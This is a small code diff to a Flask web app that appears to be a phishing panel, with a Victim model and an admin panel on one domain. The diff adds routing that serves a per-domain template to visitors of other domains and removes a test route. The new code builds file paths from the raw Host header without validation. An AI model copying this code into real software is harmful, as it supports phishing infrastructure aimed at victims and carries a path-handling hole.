@@ -5,6 +5,7 @@ from hashlib import sha256
 from db import User, Victim
 import requests
 import json
+import os
 import re
 from datetime import datetime
 from config import salt
@@ -40,7 +41,13 @@ def is_valid_domain(domain):
 
 @app.route('/')
 def index():
-    return redirect(url_for('panel'))
+    domain = request.headers.get('Host')
+    print(domain)
+    if domain == 'depian.ru':
+        return redirect(url_for('panel'))
+    else:
+        username = os.listdir(f'domains/{domain}/')[0]
+        return render_template(f'domains/{domain}/{username}')
 ###########################################
 #                                         #
 #                  Вход                   #
@@ -272,9 +279,7 @@ def add_domain():
 
 
 
-@app.route('/<name>', methods=['GET'])
-def test(name):
-    return name
+
 
 
 
